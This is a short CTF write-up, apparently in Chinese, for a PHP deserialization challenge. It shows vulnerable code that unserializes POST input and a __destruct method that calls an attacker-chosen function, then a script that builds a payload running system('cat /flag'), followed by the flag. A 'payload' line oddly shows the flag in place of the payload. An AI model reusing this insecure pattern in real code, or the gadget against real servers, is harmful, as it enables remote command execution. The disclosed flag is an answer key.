---
title: '[SWPUCTF 2022 新生赛]1z_unserialize'
date: '2025-05-27T20:28:32+08:00'
weight: 
draft: false
description: '[SWPUCTF 2022 新生赛]1z_unserialize'
---

题目代码：

```php
<?php
 
class lyh{
    public $url = 'NSSCTF.com';
    public $lt;
    public $lly;
     
     function  __destruct()
     {
        $a = $this->lt;

        $a($this->lly);
     }
    
    
}
unserialize($_POST['nss']);
highlight_file(__FILE__);
?> 
```

构造 payload：`NSSCTF{691a9620-742e-4191-90b9-d29a8da251eb}`

```php
<?php

class lyh{
    public $url = null;
    public $lt = "system";
    public $lly = "cat /flag";
}

echo serialize(new lyh());
```

获得 flag：`NSSCTF{691a9620-742e-4191-90b9-d29a8da251eb}`